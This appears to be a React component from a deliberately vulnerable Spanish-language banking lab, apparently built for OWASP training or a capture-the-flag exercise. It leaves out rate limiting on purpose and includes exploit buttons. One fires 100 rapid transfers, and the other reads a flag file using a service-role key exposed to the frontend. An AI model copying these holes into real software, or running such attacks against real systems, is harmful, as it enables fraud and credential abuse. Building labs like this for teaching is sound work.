import React, { useState } from 'react';
import '../styles/transfers.css';

const Transfers = ({ user }) => {
  const [formData, setFormData] = useState({
    fromAccount: '',
    toAccount: '',
    amount: '',
    description: ''
  });
  const [transferCount, setTransferCount] = useState(0);

  // Vulnerabilidad A04: Sin límite de tasa
  const handleTransfer = async (e) => {
    e.preventDefault();
    
    // Lógica de transferencia sin límites
    try {
      const response = await fetch(`${process.env.REACT_APP_SUPABASE_URL}/rest/v1/transfers`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('jwt_token')}`,
          'apikey': process.env.REACT_APP_SUPABASE_ANON_KEY
        },
        body: JSON.stringify({
          from_account: formData.fromAccount,
          to_account: formData.toAccount,
          amount: parseFloat(formData.amount),
          description: formData.description,
          user_id: user.sub
        })
      });
      
      if (response.ok) {
        alert('Transferencia realizada con éxito');
        setTransferCount(prev => prev + 1);
        
        // Vulnerabilidad: Permitir múltiples transferencias rápidas
        if (transferCount > 50) {
          alert('⚠️ Posible ataque de tasa límite detectado!');
        }
      }
    } catch (error) {
      console.error('Error en transferencia:', error);
    }
  };

  // Explotación automática de la vulnerabilidad A04
  const exploitRateLimit = async () => {
    for (let i = 0; i < 100; i++) {
      // Realiza 100 transferencias rápidas
      setTimeout(async () => {
        await fetch(`${process.env.REACT_APP_SUPABASE_URL}/rest/v1/transfers`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${localStorage.getItem('jwt_token')}`,
            'apikey': process.env.REACT_APP_SUPABASE_ANON_KEY
          },
          body: JSON.stringify({
            from_account: 'ES12000123456789012345',
            to_account: 'ES12987654321098765432',
            amount: 0.01,
            description: `Ataque tasa límite ${i}`,
            user_id: user.sub
          })
        });
      }, i * 10); // 10ms entre transferencias
    }
    alert('Ataque de tasa límite iniciado (100 transferencias)');
  };

  return (
    <div className="transfers-container">
      <div className="page-header">
        <h1>Transferencias</h1>
        <p>Realiza transferencias nacionales e internacionales</p>
      </div>
      
      <div className="transfers-grid">
        {/* Formulario de Transferencia */}
        <div className="transfer-form-card">
          <h3>Nueva Transferencia</h3>
          <form onSubmit={handleTransfer}>
            <div className="form-group">
              <label>Desde Cuenta</label>
              <input
                type="text"
                value={formData.fromAccount}
                onChange={(e) => setFormData({...formData, fromAccount: e.target.value})}
                placeholder="ES12 XXXX XXXX XXXX XXXX"
                required
              />
            </div>
            
            <div className="form-group">
              <label>Hacia Cuenta</label>
              <input
                type="text"
                value={formData.toAccount}
                onChange={(e) => setFormData({...formData, toAccount: e.target.value})}
                placeholder="ES12 XXXX XXXX XXXX XXXX"
                required
              />
            </div>
            
            <div className="form-group">
              <label>Cantidad (€)</label>
              <input
                type="number"
                step="0.01"
                value={formData.amount}
                onChange={(e) => setFormData({...formData, amount: e.target.value})}
                required
              />
            </div>
            
            <div className="form-group">
              <label>Descripción</label>
              <input
                type="text"
                value={formData.description}
                onChange={(e) => setFormData({...formData, description: e.target.value})}
                placeholder="Concepto de la transferencia"
              />
            </div>
            
            <button type="submit" className="btn-primary">
              Realizar Transferencia
            </button>
          </form>
        </div>
        
        {/* Historial de Transferencias */}
        <div className="transfer-history-card">
          <h3>Historial Reciente</h3>
          <div className="stats">
            <div className="stat-item">
              <span className="stat-label">Transferencias hoy</span>
              <span className="stat-value">{transferCount}</span>
            </div>
            <div className="stat-item">
              <span className="stat-label">Total movido</span>
              <span className="stat-value">
                {(transferCount * 0.01).toFixed(2)} €
              </span>
            </div>
          </div>
        </div>
        
        {/* Panel de Explotación */}
        <div className="exploit-section">
          <h4>🧪 Explotar Vulnerabilidades</h4>
          <div className="exploit-buttons">
            <button className="btn-warning" onClick={exploitRateLimit}>
              Explotar Límite de Tasa (A04)
            </button>
            <button className="btn-danger" onClick={() => {
              // Usar clave de servicio expuesta
              fetch(`${process.env.REACT_APP_SUPABASE_URL}/storage/v1/object/public/admin-secrets/secrets.txt`, {
                headers: {
                  'Authorization': `Bearer ${process.env.REACT_APP_SUPABASE_SERVICE_ROLE_KEY}`,
                  'apikey': process.env.REACT_APP_SUPABASE_SERVICE_ROLE_KEY
                }
              })
              .then(response => response.text())
              .then(data => {
                alert(`Flag obtenida: ${data}`);
              });
            }}>
              Leer Flag con Service Key (A05)
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Transfers;